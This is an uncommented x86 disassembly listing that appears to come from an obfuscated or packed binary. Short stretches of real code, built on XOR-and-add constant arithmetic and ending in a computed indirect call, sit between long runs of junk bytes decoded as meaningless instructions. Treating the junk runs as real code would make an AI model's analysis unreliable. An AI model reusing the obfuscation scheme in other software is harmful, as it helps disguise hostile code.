  4123fa:	jmp    0x412411
  4123fc:	test   al,0x83
  4123fe:	repnz lock adc eax,0x51c93a91
  412405:	aas    
  412406:	xor    eax,0x4f6a9aa2
  41240b:	ret    
  41240c:	push   0xb12c8299
  412411:	inc    edi
  412412:	ret    
  412413:	add    BYTE PTR [esi],bh
  412415:	jle    0x4123b0
  412417:	fdivr  DWORD PTR [esi+0x5]
  41241a:	rol    DWORD PTR [ebx+0x3cba2c40],cl
  412420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412421:	lahf   
  412422:	ss popf 
  412424:	sub    cl,ah
  412426:	pusha  
  412427:	adc    BYTE PTR [edi+0x1bbcfc74],bl
  41242d:	gs dec eax
  41242f:	adc    dl,BYTE PTR [ebp+0x41]
  412432:	sub    bh,ch
  412434:	dec    ebx
  412435:	in     eax,0xb1
  412437:	mov    bl,0x59
  412439:	imul   edx,ebp,0xffffffbc
  41243c:	mov    bl,0x59
  41243e:	mov    dh,0x2d
  412440:	cwde   
  412441:	adc    BYTE PTR [edx],ch
  412443:	jge    0x4123e0
  412445:	mov    WORD PTR [esi],ds
  412447:	xor    al,0xb4
  412449:	(bad)
  41244d:	in     al,dx
  41244e:	inc    edi
  41244f:	pop    esp
  412450:	xor    al,0xa4
  412452:	inc    esp
  412453:	dec    ebp
  412454:	or     DWORD PTR [edx+0x17ce41d7],esi
  41245a:	jl     0x41240c
  41245c:	and    ax,0x67ab
  412460:	cmp    ah,BYTE PTR [esp+edx*2+0x1fb0243]
  412467:	jno    0x41245f
  412469:	call   0xd1ab:0xb946f8b
  412470:	mov    cl,0x6a
  412472:	mov    ebx,?
  412474:	sti    
  412475:	cmp    eax,0x7101ff0e
  41247a:	lock adc eax,0x6225ee74
  412480:	adc    al,0x38
  412482:	ret    0x4e82
  412485:	cli    
  412486:	mov    eax,ds:0x30fb45e8
  41248b:	adc    esi,0x336fa11
  412491:	and    DWORD PTR [esi+0x9],esi
  412494:	fwait
  412495:	or     esp,edi
  412497:	cwde   
  412498:	jmp    0xca13:0x30008427
  41249f:	xchg   DWORD PTR [edx+ebx*4],edx
  4124a2:	popf   
  4124a3:	fnstsw WORD PTR [edi+0x6a]
  4124a6:	inc    ebx
  4124a7:	not    BYTE PTR [ebx-0x220cf93b]
  4124ad:	pushf  
  4124ae:	js     0x412484
  4124b0:	or     edi,DWORD PTR [ebx]
  4124b2:	ins    BYTE PTR es:[edi],dx
  4124b3:	shl    esp,cl
  4124b5:	leave  
  4124b6:	out    0xa0,eax
  4124b8:	fsubr  DWORD PTR [ebx-0x28]
  4124bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124bc:	push   es
  4124bd:	push   edi
  4124be:	xor    eax,0xe8a2b67d
  4124c3:	xchg   esp,eax
  4124c4:	jg     0x412536
  4124c6:	mov    edi,0xafc1dc4f
  4124cb:	jae    0x4124f1
  4124cd:	pop    ds
  4124ce:	push   esi
  4124cf:	jns    0x4124d0
  4124d1:	xor    al,0x5
  4124d3:	mov    bl,BYTE PTR [edx-0x67709480]
  4124d9:	mov    cl,0x47
  4124db:	jp     0x4124e0
  4124dd:	inc    ebp
  4124de:	or     BYTE PTR [ecx+0x458bf045],cl
  4124e4:	in     al,0x85
  4124e6:	ror    BYTE PTR [edi],0x84
  4124e9:	retf   0x4
  4124ec:	add    BYTE PTR [ecx+0xb6adc75],cl
  4124f2:	pop    ecx
  4124f3:	push   0x5
  4124f5:	dec    ecx
  4124f6:	pop    ebx
  4124f7:	xchg   ebx,ecx
  4124f9:	sub    ebx,ecx
  4124fb:	xchg   ebx,ecx
  4124fd:	dec    ecx
  4124fe:	mov    eax,DWORD PTR [ebp-0x1c]
  412501:	imul   eax,ecx
  412504:	sub    esp,eax
  412506:	mov    DWORD PTR [ebp-0x24],esp
  412509:	mov    eax,DWORD PTR [ebp-0x4]
  41250c:	mov    ecx,0x7510851
  412511:	xor    eax,ecx
  412513:	mov    edx,0x327299
  412518:	add    eax,edx
  41251a:	mov    DWORD PTR [ebp+0x8],eax
  41251d:	mov    eax,DWORD PTR [ebp-0x18]
  412520:	xor    eax,ecx
  412522:	add    eax,edx
  412524:	mov    edx,DWORD PTR [ebp+0x14]
  412527:	imul   eax,DWORD PTR [edx]
  41252a:	mov    edx,DWORD PTR [ebp-0x4]
  41252d:	xor    edx,ecx
  41252f:	mov    ecx,DWORD PTR [ebp+0x8]
  412532:	lea    ecx,[edx+ecx*1+0x327299]
  412539:	cmp    ecx,eax
  41253b:	je     0x4129b2
  412541:	mov    edi,DWORD PTR [ebp-0x18]
  412544:	mov    eax,DWORD PTR [ebp+0x8]
  412547:	mov    edx,DWORD PTR [ebp+0x14]
  41254a:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41254e:	mov    ecx,0x7510851
  412553:	xor    edx,edx
  412555:	xor    edi,ecx
  412557:	mov    esi,0x327299
  41255c:	add    edi,esi
  41255e:	div    edi
  412560:	mov    edx,DWORD PTR [ebp-0x4]
  412563:	xor    edx,ecx
  412565:	lea    eax,[edx+eax*1+0x327299]
  41256c:	mov    edx,DWORD PTR [ebp+0x8]
  41256f:	mov    edi,DWORD PTR [ebp-0x24]
  412572:	mov    DWORD PTR [edi+edx*4],eax
  412575:	mov    eax,DWORD PTR [ebp-0x18]
  412578:	mov    edx,DWORD PTR [ebp+0x8]
  41257b:	xor    eax,ecx
  41257d:	lea    eax,[eax+edx*1+0x327299]
  412584:	mov    DWORD PTR [ebp+0x8],eax
  412587:	mov    eax,DWORD PTR [ebp-0x18]
  41258a:	mov    edx,DWORD PTR [ebp+0x14]
  41258d:	jmp    0x41278d
  412592:	inc    esp
  412593:	mov    edx,0x5c849cfa
  412598:	pop    esp
  412599:	push   edx
  41259a:	outs   dx,BYTE PTR ds:[esi]
  41259b:	outs   dx,DWORD PTR ds:[esi]
  41259c:	stos   DWORD PTR es:[edi],eax
  41259d:	(bad)  
  41259e:	inc    edi
  41259f:	push   edx
  4125a0:	or     eax,0x7e5d591e
  4125a5:	jle    0x412600
  4125a7:	jg     0x412627
  4125a9:	jle    0x412626
  4125ab:	mov    dl,0xad
  4125ad:	xchg   ch,ch
  4125af:	das    
  4125b0:	test   eax,0x63be910c
  4125b5:	ret    
  4125b6:	push   eax
  4125b7:	shl    DWORD PTR [ebx+0x44753bda],0xab
  4125be:	mov    edi,0xe25437fa
  4125c3:	adc    eax,0x1e9db10a
  4125c8:	inc    edx
  4125c9:	inc    ecx
  4125ca:	mov    cl,0x3d
  4125cc:	and    BYTE PTR [esi+0x46201544],ch
  4125d2:	addr16 loopne 0x412564
  4125d5:	hlt    
  4125d6:	out    0x20,al
  4125d8:	call   0xfd15b9cf
  4125dd:	mov    cl,0xa7
  4125df:	jb     0x4125fd
  4125e1:	push   esp
  4125e2:	dec    eax
  4125e3:	pushf  
  4125e4:	in     al,dx
  4125e5:	inc    eax
  4125e6:	xor    eax,0x13637f85
  4125eb:	daa    
  4125ec:	pop    ds
  4125ed:	cmp    eax,0x3b3c569b
  4125f2:	pop    eax
  4125f3:	cmp    DWORD PTR [ebp-0x61],esi
  4125f6:	lods   al,BYTE PTR ds:[esi]
  4125f7:	and    esi,ebx
  4125f9:	add    edx,DWORD PTR [ebp-0x234a9a9c]
  4125ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412600:	addr16 fs push esi
  412603:	adc    al,0x67
  412605:	nop
  412606:	mov    ebp,0x5d1f69d7
  41260b:	in     eax,dx
  41260c:	sbb    dl,BYTE PTR [esi-0x3c425868]
  412612:	or     esp,DWORD PTR es:[esi]
  412615:	(bad)  
  412616:	(bad)  
  412617:	xlat   BYTE PTR ds:[ebx]
  412618:	sub    eax,0x862d3973
  41261d:	dec    ebx
  41261e:	push   esi
  41261f:	(bad)  
  412621:	in     eax,0x12
  412623:	(bad)  [edx+0x3d]
  412626:	cmp    al,0xe0
  412628:	hlt    
  412629:	push   eax
  41262a:	add    DWORD PTR [ebx],esp
  41262c:	mov    al,0x6f
  41262e:	vpackuswb ymm2,ymm7,YMMWORD PTR [ecx-0x6d231fda]
  412636:	sub    edx,esi
  412638:	jmp    0x41265c
  41263a:	lock pop edi
  41263c:	xchg   ebx,eax
  41263d:	div    DWORD PTR [eax-0x4ac27c41]
  412643:	mov    bl,0x9a
  412645:	xor    BYTE PTR [edx],bl
  412647:	sbb    al,0x97
  412649:	inc    ebx
  41264a:	jns    0x4126af
  41264c:	mov    ds:0x697bb27c,al
  412651:	jp     0x41260e
  412653:	dec    esi
  412654:	inc    ebp
  412655:	xchg   edx,eax
  412656:	repz aad 0x1c
  412659:	(bad)  
  41265a:	(bad)  
  41265b:	in     al,0xd
  41265d:	inc    ebp
  41265e:	mul    dh
  412660:	and    al,BYTE PTR [edx-0x1aac5c2d]
  412666:	xchg   BYTE PTR ds:0xa2af7223,ch
  41266c:	in     eax,0x52
  41266e:	cmp    eax,0x7aaf89a6
  412673:	mov    al,ds:0x51dd7409
  412678:	ficom  DWORD PTR [eax+0x842f227]
  41267e:	mov    ah,0x2d
  412680:	test   DWORD PTR [edi+0x40b30b55],ebx
  412686:	inc    esp
  412687:	aad    0x19
  412689:	sub    DWORD PTR [ebx-0x50a002af],esp
  41268f:	in     al,0xa
  412691:	or     BYTE PTR [eax],ch
  412693:	jnp    0x4126e0
  412695:	pop    ds
  412696:	iret   
  412697:	mov    al,0xab
  412699:	xchg   esi,eax
  41269a:	(bad)  
  41269b:	sub    ecx,DWORD PTR [edi]
  41269d:	or     dh,BYTE PTR [edx-0x70]
  4126a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126a1:	mov    ds:0x5a6f4db2,eax
  4126a6:	and    ah,BYTE PTR [edi]
  4126a8:	and    ebx,DWORD PTR [edi]
  4126aa:	loop   0x4126bf
  4126ac:	mov    al,0xff
  4126ae:	(bad)  
  4126af:	push   ebx
  4126b0:	mov    edx,0xe7473169
  4126b5:	int3   
  4126b6:	punpckldq mm7,DWORD PTR [ebx]
  4126b9:	mov    edi,0xb0a008e3
  4126be:	loopne 0x4126c2
  4126c0:	ret    
  4126c1:	call   0xcc20:0x11b4a50c
  4126c8:	push   ss
  4126c9:	arpl   WORD PTR [ebx-0x71],bp
  4126cc:	gs sti 
  4126ce:	xchg   ebx,eax
  4126cf:	mov    ch,0x35
  4126d1:	js     0x4126b5
  4126d3:	xchg   esp,eax
  4126d4:	push   cs
  4126d5:	adc    dh,al
  4126d7:	cmp    BYTE PTR [esi+edi*1],0xaa
  4126db:	push   esi
  4126dc:	retf   0xbeb5
  4126df:	push   eax
  4126e0:	dec    ecx
  4126e1:	pop    edi
  4126e2:	dec    esp
  4126e3:	fidivr DWORD PTR [edi-0x53]
  4126e6:	or     DWORD PTR [ecx+0x29422305],edi
  4126ec:	jmp    0x28c5:0xff5477a3
  4126f3:	repz in al,0x2e
  4126f6:	push   cs
  4126f7:	test   ecx,esp
  4126f9:	in     al,0xd6
  4126fb:	imul   eax,DWORD PTR [ebx-0x28ed06b9],0x68ed27ba
  412705:	cmp    ebx,DWORD PTR [ecx-0x60]
  412708:	data16 or al,0x7f
  41270b:	mov    bh,0xe9
  41270d:	(bad)  
  41270e:	pop    ds
  41270f:	fld    DWORD PTR [ebx+0x4d]
  412712:	cmc    
  412713:	pop    ss
  412714:	adc    al,BYTE PTR [eax-0x5e]
  412717:	icebp  
  412718:	mov    bh,0x12
  41271a:	dec    edi
  41271b:	dec    ebp
  41271c:	js     0x412778
  41271e:	clc    
  41271f:	icebp  
  412720:	add    DWORD PTR [edx],0xffffff8b
  412723:	sbb    eax,0x12519499
  412728:	mov    ebx,0x4443472b
  41272d:	adc    BYTE PTR ds:0x25be423f,ch
  412733:	adc    cl,BYTE PTR [ebx+eax*2]
  412736:	cmp    al,0xf9
  412738:	mov    esi,edi
  41273a:	or     ah,BYTE PTR ds:0x1d4c49f0
  412740:	test   DWORD PTR [ebx],ebx
  412742:	scas   al,BYTE PTR es:[edi]
  412743:	aam    0x68
  412745:	fstp   DWORD PTR [ebx]
  412747:	or     ah,ah
  412749:	jae    0x4127a3
  41274b:	in     eax,dx
  41274c:	jo     0x4126e4
  41274e:	hlt    
  41274f:	outs   dx,DWORD PTR ss:[esi]
  412751:	or     al,0x16
  412753:	inc    eax
  412754:	push   ecx
  412755:	fimul  WORD PTR [eax]
  412757:	cmp    esp,DWORD PTR [eax+eiz*1+0x36c619d7]
  41275e:	sub    ch,BYTE PTR [esi+0x25efd747]
  412764:	js     0x412719
  412766:	fimul  WORD PTR [edx-0x5db079a1]
  41276c:	pushf  
  41276d:	sbb    ecx,ebp
  41276f:	dec    ecx
  412770:	in     al,dx
  412771:	lods   eax,DWORD PTR ds:[esi]
  412772:	jnp    0x41270b
  412774:	std    
  412775:	pop    ebp
  412776:	imul   edi,DWORD PTR [ebx-0x33],0xffffffb9
  41277a:	pop    ebx
  41277b:	sbb    BYTE PTR [esi-0x47],dl
  41277e:	xchg   edi,eax
  41277f:	sbb    esp,0xc5b7eea1
  412785:	mov    ebp,0x995db35e
  41278a:	cdq    
  41278b:	mov    edi,DWORD PTR [eax]
  41278d:	xor    eax,ecx
  41278f:	jmp    0x41298f
  412794:	aaa    
  412795:	cmp    al,0xc7
  412797:	cdq    
  412798:	int    0x75
  41279a:	jno    0x412758
  41279c:	ja     0x41277e
  41279e:	loope  0x4127ba
  4127a0:	add    bh,BYTE PTR [esi+0x55]
  4127a3:	in     al,dx
  4127a4:	inc    esp
  4127a5:	pop    edi
  4127a6:	jle    0x412826
  4127a8:	pop    ecx
  4127a9:	jg     0x412829
  4127ab:	jle    0x412816
  4127ad:	ja     0x41274a
  4127af:	and    al,0x14
  4127b1:	xor    BYTE PTR [esi+0x6],0x37
  4127b5:	inc    edx
  4127b6:	xor    ch,cl
  4127b8:	pop    ss
  4127b9:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4127bb:	sub    ebx,DWORD PTR [ecx]
  4127bd:	xor    eax,0x89aa6c0f
  4127c2:	jg     0x412788
  4127c4:	aad    0x7b
  4127c6:	mov    ds:0xd9271895,al
  4127cb:	rcl    BYTE PTR [ecx-0x103a6d03],1
  4127d1:	or     al,BYTE PTR [esi]
  4127d3:	mov    eax,ds:0x6e6a06f7
  4127d8:	ror    BYTE PTR [esi+0x42],cl
  4127db:	nop
  4127dc:	mov    ebx,0x3b20dca8
  4127e1:	xchg   edi,eax
  4127e2:	pop    ebx
  4127e3:	addr16 xor eax,0x66674032
  4127e9:	mov    eax,ds:0xbcfde72f
  4127ee:	test   al,0xcb
  4127f0:	rcr    BYTE PTR [ecx-0x3fd156f],1
  4127f6:	add    BYTE PTR [edx+0x124e22be],dl
  4127fc:	jns    0x412798
  4127fe:	xor    bl,BYTE PTR [ebx+0x27d904cd]
  412804:	inc    ebp
  412805:	stos   DWORD PTR es:[edi],eax
  412806:	and    eax,DWORD PTR [edi]
  412808:	pop    edx
  412809:	inc    eax
  41280a:	jle    0x4127ad
  41280c:	inc    esp
  41280d:	jb     0x41280a
  41280f:	div    DWORD PTR [eax]
  412811:	cmp    eax,0x2d06ee48
  412816:	sub    al,0x4b
  412818:	push   eax
  412819:	outs   dx,DWORD PTR ds:[esi]
  41281a:	(bad)  
  41281b:	jno    0x4127eb
  41281d:	dec    eax
  41281e:	adc    dh,BYTE PTR [edx+ecx*8+0x563446ae]
  412825:	test   BYTE PTR [eax+0x2bd6d7a4],dl
  41282b:	cli    
  41282c:	ins    DWORD PTR es:[edi],dx
  41282d:	push   0x68
  41282f:	xchg   esi,eax
  412830:	jge    0x41282f
  412832:	int3   
  412833:	inc    edi
  412834:	test   al,0x5
  412836:	sub    al,0x1a
  412838:	retf   0xe8b7
  41283b:	pop    esp
  41283c:	jae    0x4127d9
  41283e:	test   BYTE PTR [ebp+esi*8+0x37],dl
  412842:	into   
  412843:	loopne 0x4128b2
  412845:	ss mov esp,0xa664983a
  41284b:	hlt    
  41284c:	mov    eax,ds:0xb46c65bb
  412851:	vmread ebx,edi
  412854:	lahf   
  412855:	in     al,0x70
  412857:	adc    eax,DWORD PTR [esi+0x283ddeb2]
  41285d:	push   es
  41285e:	(bad)  
  41285f:	imul   eax,ebp,0xffffffce
  412862:	pop    edx
  412863:	test   BYTE PTR [ebp-0x51740994],dh
  412869:	push   esp
  41286a:	aas    
  41286b:	and    DWORD PTR [ecx+edx*2-0xbd62b1e],0x5
  412873:	sbb    bl,BYTE PTR [edi+0x48]
  412876:	sub    al,0xe1
  412878:	push   ds
  412879:	jl     0x412829
  41287b:	sbb    eax,0xa719c16c
  412880:	inc    ecx
  412881:	sbb    DWORD PTR [ecx+0x123d5701],edi
  412887:	mov    dl,0xd
  412889:	cmp    al,0x18
  41288b:	sub    ebx,edx
  41288d:	add    edi,DWORD PTR [eax+0x16]
  412890:	sbb    al,0xc2
  412892:	sub    DWORD PTR [edi-0x65],0xffffffc2
  412896:	jno    0x4128c4
  412898:	xor    BYTE PTR [edx],ch
  41289a:	xchg   edx,eax
  41289b:	pop    esp
  41289c:	nop
  41289d:	aas    
  41289e:	xchg   ecx,eax
  41289f:	xchg   esp,eax
  4128a0:	add    eax,0x57ced61f
  4128a5:	and    al,BYTE PTR ds:0x15d7d6fa
  4128ab:	add    edx,DWORD PTR [eax]
  4128ad:	fisubr DWORD PTR [eax+0x75acb207]
  4128b3:	xchg   ebx,eax
  4128b4:	mov    BYTE PTR [eax+0x36],ah
  4128b7:	sahf   
  4128b8:	cld    
  4128b9:	test   al,0xb
  4128bb:	mov    ds:0x8ac2e81b,al
  4128c0:	aad    0x88
  4128c2:	add    BYTE PTR [ebp+0x1c],0x33
  4128c6:	in     al,0x7e
  4128c8:	mov    al,0x7e
  4128ca:	cmp    eax,0xee26ed8a
  4128cf:	(bad)  
  4128d0:	cld    
  4128d1:	pop    eax
  4128d2:	outs   dx,DWORD PTR ds:[esi]
  4128d3:	xor    al,0xd0
  4128d5:	test   DWORD PTR [esi-0x74756873],esi
  4128db:	jbe    0x41290e
  4128dd:	push   es
  4128de:	add    dl,BYTE PTR [edi+0x72]
  4128e1:	xor    ebp,DWORD PTR [ebx]
  4128e3:	in     al,dx
  4128e4:	pop    ebx
  4128e5:	sbb    cl,BYTE PTR [ebp-0x7941c7c5]
  4128eb:	dec    DWORD PTR [ebp+0x75ac3df]
  4128f1:	pop    es
  4128f2:	(bad)  
  4128f3:	in     eax,dx
  4128f4:	adc    eax,0xfaa59c97
  4128f9:	adc    BYTE PTR [edx+0x1e965204],bh
  4128ff:	repz scas eax,DWORD PTR es:[edi]
  412901:	add    ecx,esi
  412903:	xchg   si,ax
  412905:	cmp    BYTE PTR [ecx+0x635bb0d1],0x2d
  41290c:	cmp    al,0xae
  41290e:	mov    bl,0x60
  412910:	xor    bl,BYTE PTR [eax+0x6983fc08]
  412916:	xor    BYTE PTR [eax],0x4f
  412919:	pop    ds
  41291a:	pop    edx
  41291b:	mov    eax,0x7077640f
  412920:	xor    DWORD PTR [ebx],0x7d0b8d28
  412926:	mov    cl,0xe0
  412928:	in     al,dx
  412929:	lea    ecx,[esi-0x8]
  41292c:	loope  0x41292b
  41292e:	stc    
  41292f:	lock pop ebx
  412931:	cld    
  412932:	add    ebx,edi
  412934:	into   
  412935:	gs xor cl,al
  412938:	and    BYTE PTR [edi-0x2f],bl
  41293b:	and    eax,0x6fdb3a78
  412940:	dec    edx
  412941:	and    eax,0x625d0eee
  412946:	lds    ebp,FWORD PTR [esi]
  412948:	mov    ah,0x67
  41294a:	(bad)  
  41294b:	not    BYTE PTR [esp+ecx*2+0x7b5f7fd1]
  412952:	jg     0x412993
  412954:	in     al,dx
  412955:	mov    eax,ds:0xf2f93f5c
  41295a:	inc    edi
  41295b:	rol    DWORD PTR [edx],cl
  41295d:	(bad)  
  41295e:	cmp    edx,DWORD PTR [edi-0x6d745539]
  412964:	(bad)  
  412965:	(bad)  
  412966:	mov    edx,edi
  412968:	jae    0x4129b6
  41296a:	inc    eax
  41296b:	push   cs
  41296c:	pop    es
  41296d:	fistp  QWORD PTR [ebp+0x5d]
  412970:	cmp    eax,0x87c56eac
  412975:	and    eax,0x7f00191b
  41297a:	jmp    0xe12c:0xe831bc6e
  412981:	nop
  412982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412983:	or     al,0xeb
  412985:	push   esp
  412986:	inc    esi
  412987:	test   eax,0xb359822b
  41298c:	jmp    0x4129d3
  41298e:	cmp    eax,DWORD PTR [ebx]
  412990:	(bad)  
  412991:	imul   eax,DWORD PTR [edx]
  412994:	mov    edx,DWORD PTR [ebp-0x4]
  412997:	xor    edx,ecx
  412999:	mov    ecx,DWORD PTR [ebp+0x8]
  41299c:	lea    ecx,[edx+ecx*1+0x327299]
  4129a3:	cmp    ecx,eax
  4129a5:	jne    0x412541
  4129ab:	mov    ebx,esi
  4129ad:	jmp    0x4129b7
  4129b2:	mov    ebx,0x327299
  4129b7:	mov    eax,DWORD PTR [ebp-0x4]
  4129ba:	xor    eax,0x7510851
  4129bf:	add    eax,ebx
  4129c1:	mov    DWORD PTR [ebp-0xc],eax
  4129c4:	xor    ebx,ebx
  4129c6:	lea    eax,[ebp-0x10]
  4129c9:	add    ebx,DWORD PTR [eax]
  4129cb:	call   ebx
  4129cd:	xor    ebx,ebx
  4129cf:	inc    ebx
  4129d0:	cmp    DWORD PTR [ebp+0x10],ebx
  4129d3:	je     0x412bf1
  4129d9:	xchg   edx,eax
  4129da:	push   0xa
  4129dc:	pop    ecx
  4129dd:	jmp    0x412bdd
  4129e2:	jmp    0x757c:0x13b47be7
  4129e9:	popa   
  4129ea:	cmc    
  4129eb:	xchg   dh,dl
  4129ed:	fdiv   DWORD PTR [ebx]
  4129ef:	retf   
  4129f0:	fwait
  4129f1:	cmp    DWORD PTR [edi+0x597e7e59],esp
  4129f7:	jg     0x412a77
  4129f9:	jle    0x412a33
  4129fb:	pop    edx
  4129fc:	pop    ds
  4129fd:	sbb    edi,DWORD PTR [edi]
  4129ff:	sbb    ecx,DWORD PTR [ebp-0x572c3ddb]
  412a05:	mov    bh,0x7e
  412a07:	mov    dh,al
  412a09:	test   BYTE PTR [ebp-0x5c],ch
  412a0c:	retf   
  412a0d:	or     cl,BYTE PTR [ebx]
  412a0f:	mov    ebx,0xab40b20f
  412a14:	adc    al,0x43
  412a16:	jle    0x412a83
  412a18:	daa    
  412a19:	sbb    DWORD PTR [edi-0x641dd353],ebp
  412a1f:	sbb    dh,BYTE PTR [ebx-0x52baa5cc]
  412a25:	xchg   ebp,esi
  412a27:	pushf  
  412a28:	or     eax,0xc9600a3d
  412a2d:	and    al,0xf4
  412a2f:	xor    al,0xac
  412a31:	mov    ebp,0x1ebbdb
  412a36:	sti    
  412a37:	arpl   dx,bp
  412a39:	into   
  412a3a:	in     eax,0xf9
  412a3c:	push   ds
  412a3d:	sub    DWORD PTR [edi],esi
  412a3f:	push   esp
  412a40:	jb     0x412a19
  412a42:	or     eax,0xee07817c
  412a47:	push   ds
  412a48:	mov    fs,ebx
  412a4a:	pop    ecx
  412a4b:	dec    eax
  412a4c:	ins    DWORD PTR es:[edi],dx
  412a4d:	clc    
  412a4e:	or     eax,DWORD PTR [edi-0x4d771147]
  412a54:	push   eax
  412a55:	mov    ecx,DWORD PTR [ecx+0x69]
  412a58:	js     0x412a5b
  412a5a:	add    DWORD PTR [ebp-0x35],0xf77b6723
  412a61:	arpl   WORD PTR [ebx],ax
  412a63:	dec    esp
  412a64:	xchg   BYTE PTR [ecx],al
  412a66:	jno    0x412ac9
  412a68:	retf   0x1d17
  412a6b:	sub    eax,0xb7779a90
  412a70:	xor    al,0x20
  412a72:	push   es
  412a73:	repz and BYTE PTR [ebp+ebp*2+0xe],bl
  412a78:	ja     0x412ad6
  412a7a:	cdq    
  412a7b:	mov    WORD PTR [edx],?
  412a7d:	mov    dl,0xf8
  412a7f:	aas    
  412a80:	inc    ebx
  412a81:	sar    DWORD PTR ds:0xb254e2bd,cl
  412a87:	jb     0x412a80
  412a89:	pop    ss
  412a8a:	mov    bl,0x49
  412a8c:	sub    eax,0x7750784e
  412a91:	aad    0xda
  412a93:	dec    edx
  412a94:	mov    dl,0xd6
  412a96:	sub    al,0xf0
  412a98:	aaa    
  412a99:	mov    ebx,0x6e1b9dbc
  412a9e:	rol    DWORD PTR [edx*2+0x63ef7975],1
  412aa5:	dec    edx
  412aa6:	push   esp
  412aa7:	xchg   esp,eax
  412aa8:	(bad)  
  412aa9:	xor    al,0xb5
  412aab:	mov    esp,DWORD PTR cs:[eax+0x25]
  412aaf:	mov    cs,esp
  412ab1:	and    ah,dl
  412ab3:	jb     0x412abc
  412ab5:	ja     0x412ad9
  412ab7:	sti    
  412ab8:	xrstor [ecx]
  412abb:	mov    WORD PTR [edx-0x4aa2014d],gs
  412ac1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ac2:	pop    edx
  412ac3:	aad    0xf3
  412ac5:	pop    ecx
  412ac6:	xchg   ecx,ebx
  412ac8:	xor    dl,BYTE PTR [esi-0x553a4ed8]
  412ace:	rcr    bh,1
  412ad0:	outs   dx,BYTE PTR ds:[esi]
  412ad1:	sar    BYTE PTR [ebx],cl
  412ad3:	out    0x6f,eax
  412ad5:	mov    ch,0x4b
  412ad7:	rol    DWORD PTR [ebx-0x3cc4b24e],1
  412add:	cmp    esp,ecx
  412adf:	dec    ecx
  412ae0:	adc    ch,BYTE PTR [eax+0x77]
  412ae3:	ss add ebx,edx
  412ae6:	xor    esi,DWORD PTR ds:0xf2bed716
  412aec:	lahf   
  412aed:	dec    esi
  412aee:	cwde   
  412aef:	cmp    esp,esp
  412af1:	ds sub eax,0x323755ba
  412af7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412af8:	sbb    edi,0x77478451
  412afe:	clc    
  412aff:	mov    ah,bl
  412b01:	cld    
  412b02:	rcr    BYTE PTR [ebx],0x17
  412b05:	imul   ebx,DWORD PTR [esi],0xffffff8a
  412b08:	jl     0x412ad9
  412b0a:	dec    esp
  412b0b:	and    al,0x56
  412b0d:	test   edi,ebp
  412b0f:	pop    esp
  412b10:	or     eax,0x24df7df0
  412b15:	xlat   BYTE PTR ds:[ebx]
  412b16:	inc    ecx
  412b17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b18:	aam    0xe8
  412b1a:	clc    
  412b1b:	cwde   
  412b1c:	call   0xe3dda342
  412b21:	call   0xfdd1d0bb
  412b26:	push   0xfc60c6e
  412b2b:	dec    edx
  412b2c:	jl     0x412b27
  412b2e:	inc    esi
  412b2f:	test   al,0xcf
  412b31:	push   es
  412b32:	mov    bh,0xd3
  412b34:	push   es
  412b35:	sub    ch,bh
  412b37:	and    esi,DWORD PTR [edx-0x3b0349fa]
  412b3d:	lea    ebx,[ebx-0x49f686a2]
  412b43:	daa    
  412b44:	mov    al,0x50
  412b46:	mov    eax,DWORD PTR [esi*2+0x1172cfba]
  412b4d:	dec    eax
  412b4e:	int    0x9e
  412b50:	(bad)  
  412b51:	retf   
  412b52:	ror    cl,cl
  412b54:	das    
  412b55:	push   es
  412b56:	sar    al,1
  412b58:	jp     0x412b6b
  412b5a:	inc    ecx
  412b5b:	inc    esi
  412b5c:	aas    
  412b5d:	pop    esi
  412b5e:	aaa    
  412b5f:	sbb    DWORD PTR [eax],esi
  412b61:	les    edi,FWORD PTR [esi+0x38]
  412b64:	mov    edx,0xfb4c605c
  412b69:	aad    0x50
  412b6b:	stos   DWORD PTR es:[edi],eax
  412b6c:	xchg   ecx,eax
  412b6d:	sub    eax,0xed9cad45
  412b72:	or     bl,BYTE PTR [edx+ebp*2]
  412b75:	aas    
  412b76:	inc    ebx
  412b77:	xchg   BYTE PTR [edi+0x5d87f43c],dh
  412b7d:	sub    DWORD PTR [ecx],eax
  412b7f:	xchg   DWORD PTR ds:0xf54f079,esi
  412b85:	xchg   ecx,eax
  412b86:	out    0x6f,al
  412b88:	sub    eax,0x437cde8b
  412b8d:	test   ebx,esp
  412b8f:	and    al,0xa9
  412b91:	dec    edi
  412b92:	pop    ds
  412b93:	mov    cl,0x2
  412b95:	ret    0xf49b
  412b98:	push   cs
  412b99:	iret   
  412b9a:	(bad)  
  412b9b:	retf   
  412b9c:	sub    ebp,edi
  412b9e:	retf   0x681c
  412ba1:	sub    cl,bl
  412ba3:	pushf  
  412ba4:	imul   esi,edi,0x64
  412ba7:	popa   
  412ba8:	aad    0xa8
  412baa:	and    al,0x4
  412bac:	lahf   
  412bad:	sub    BYTE PTR [edi+0x72958b92],dh
  412bb3:	mov    eax,0x28c1fd95
  412bb8:	sbb    al,0xbc
  412bba:	sbb    DWORD PTR [ecx-0x5e],0xbc2d3046
  412bc1:	xchg   ebx,eax
  412bc2:	inc    esp
  412bc3:	jns    0x412bdd
  412bc5:	(bad)  
  412bc6:	push   0xffffffa2
  412bc8:	and    ch,BYTE PTR [ecx-0x114a88e3]
  412bce:	(bad)  [edi+0x37]
  412bd1:	ins    BYTE PTR es:[edi],dx
  412bd2:	add    bl,BYTE PTR [eax+ebx*8]
  412bd5:	mov    edx,DWORD PTR [ebp-0x43]
  412bd8:	jmp    0x680d9ce5
  412bdd:	push   0x4
  412bdf:	pop    ebx
  412be0:	inc    ebx
  412be1:	xchg   ebx,ecx
  412be3:	sub    ebx,ecx
  412be5:	xchg   ebx,ecx
  412be7:	dec    ecx
  412be8:	mov    eax,DWORD PTR [ebp-0x1c]
  412beb:	imul   eax,ecx
  412bee:	add    esp,eax
  412bf0:	xchg   edx,eax
  412bf1:	push   eax
  412bf2:	xor    ebx,ebx
  412bf4:	mov    edx,esp
  412bf6:	dec    edx
  412bf7:	inc    ebx
  412bf8:	add    ebx,DWORD PTR [edx+ebx*1]
